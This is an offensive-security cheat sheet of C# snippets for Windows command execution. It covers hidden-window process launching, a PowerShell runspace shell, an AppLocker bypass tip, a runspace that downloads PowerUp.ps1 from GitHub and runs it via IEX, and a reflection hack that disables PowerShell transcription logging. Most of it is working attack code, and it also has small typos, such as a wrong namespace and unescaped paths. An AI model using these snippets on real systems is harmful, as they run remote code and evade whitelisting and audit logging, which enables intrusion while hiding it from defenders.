# Command Execution

## Execute Commands

### Wrapper

```cs
using System.Diagnostics;

class Program {
    static void Main() {
        Execute("<commands>");
    }

	static void Execute(string commands) {
		Process.Start(commands);
	}
}
```

Another variant using `ProcessStartInfo` object.

```cs
using System.Diagnostics;

namespace Execution {
    class Program {
	    static void Main(string[] args) {
		    Execute("C:\\path\to\program.exe", "<arguments>");
	    }

        static void Execute(string command, string arguments) {
            Process process = new Process();
            ProcessStartInfo process_Info = new ProcessStartInfo(command, arguments);
            process_Info.CreateNoWindow = true;
            process.StartInfo = process_Info;
            process.Start();
        }
    }
}
```

## Runspace

### Interactive Shell

```cs
using System;
using System.Collection.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace AwesomerShell {
    class Program {
        static void Main(string[] args) {
            Console.Write("aps> ");
            string cmd = Console.ReadLine();

            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(cmd);

            Collection<PSObject> output = ps.Invoke();
            if (output != null) {
                foreach (PSObject rtnItem in output) {
                    Console.WriteLine(rtnItem.ToString());
                }
            }

            rs.Close();
            Console.Write("Press any key to exit.");
            Console.ReadLine();
        }
    }
}
```

### Execute Cmdlets

> [!NOTE] Bypass AppLocker
> Copy this program in the `C:\Windows\Tasks` directory when evading AppWhitelisting because Windows Security will detect due to Group Policy Properties is configured in the **Active Directory**.

```cs
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace Bypass_Applocker_Language {
    class Program {
            static void Main(string[] args) {
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();

            PowerShell powershell = PowerShell.Create();
            powershell.Runspace = runspace;

            // String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
            String cmd = "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1') | IEX; Invoke-AllChecks | Out-File C:\\Windows\\Temp\vulns.txt";
            powershell.AddScript(cmd);
            powershell.Invoke();
            runspace.Close();
        }
    }
}
```

### Bypass PowerShell Logging

```cs
using System;
using System.Reflection;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Collections.ObjectModel;

namespace CustomRunspace {
    class CustomRunspace {
        static void Main(string[] args) {
            Runspace rs = RunspaceFactory.CreateRunspace();

            // Transcription Logging Bypass
            BindingFlags bf = BindingFlags.NonPublic | BindingFlags.Static;
            ConcurrentDictionary<string, Dictionary<string, object>> value = (ConcurrentDictionary<string, Dictionary<string, object>>) rs.GetType().Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings", bf).GetValue(null);
            Dictionary<string, object> dic = new Dictionary<string, object>();
            dic.Add("EnableTranscripting", "0");
            value.GetOrAdd("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription", dic);

            // Open Runspace, cachedGroupPolicySettings seem to be read now
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddCommand("Get-Runspace");

            Collection<PSObject> results = ps.Invoke();
            foreach (var result in results)
            {
                Console.WriteLine(result);
            }
            rs.Close();
        }
    }
```

---
## References

### Ben0xA

- [Ben0xA: Gray Hat PowerShell Ben Ten](https://www.youtube.com/watch?v=893NGtZlod8)

### AvantGuard

- [AvantGuard: PowerShell Enhanced Logging Capabilities Bypass](https://avantguard.io/en/blog/powershell-enhanced-logging-capabilities-bypass)